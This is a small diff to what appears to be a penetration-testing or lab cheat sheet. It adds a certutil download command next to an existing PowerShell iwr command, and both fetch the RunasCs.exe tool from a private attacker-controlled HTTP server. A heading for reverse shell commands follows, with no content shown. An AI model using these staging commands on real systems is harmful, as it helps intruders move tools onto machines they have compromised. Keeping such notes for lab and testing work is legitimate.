@@ -1,6 +1,8 @@
 # Download
 ```powershell
 iwr -uri http://10.10.15.236:8088/RunasCs.exe -OutFile RunasCs.exe
+
+certutil -urlcache -split -f http://10.10.15.236:8088/RunasCs.exe RunasCs.exe
 ```
 
 # Reverse Shell CMD
